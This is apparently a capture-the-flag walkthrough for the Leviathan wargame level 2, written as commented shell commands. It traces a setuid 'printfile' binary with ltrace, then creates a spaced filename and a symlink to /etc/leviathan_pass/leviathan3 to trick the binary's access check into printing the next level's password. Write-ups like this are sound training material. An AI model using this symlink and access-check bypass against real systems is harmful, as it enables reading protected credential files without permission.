#Alright, we are back in the void again and must ls or ls -la to see
#what we can do next

ls

#After ls it shows a red highlighted word saying "printfile"

ls -la

#shows the other files but still the red highlighted "printfile"
#cd ./printfile does not do anything, but lets try cat

cat printfile

#symbols and words show up, some of it seems encrypted
#lets see what print file does with ./printfile

./printfile

#says ***file printer*** usage: ./printfile filename
#so in a way using ./printfile is just like using cat
#but it is saying "You can't have that file"
#and trying a leviathan2 file says permission denied
#I am going to make a folder called "ladybug" 
#and a txt file called "derp" in the temporary file
#then run a ltrace and see what comes up in the background script

mkdir /tmp/ladybug && touch /tmp/ladybug/file\ derp.txt

cd /tmp/ladybug

ls -la

ltrace ~/printfile "file derp.txt"

#we can see that there is "access(derp.txt,4)
#it seems like it is checking to see if what is being typed matches up
#to whatever the "4" stands for
#we know that there is cat on file derp
#so we need to exploit "file" and bring the password into our tmp file
#lets try to symbolic link the password "file" to our tmp file
#using the "/etc/leviathan_pass/leviathan3"

ln -s /etc/leviathan_pass/leviathan3 /tmp/ladybug/file

ls -la

#we can see it so lets try printfile and "file derp.txt"

~/printfile "file derp.txt"

#it worked and now we got the password
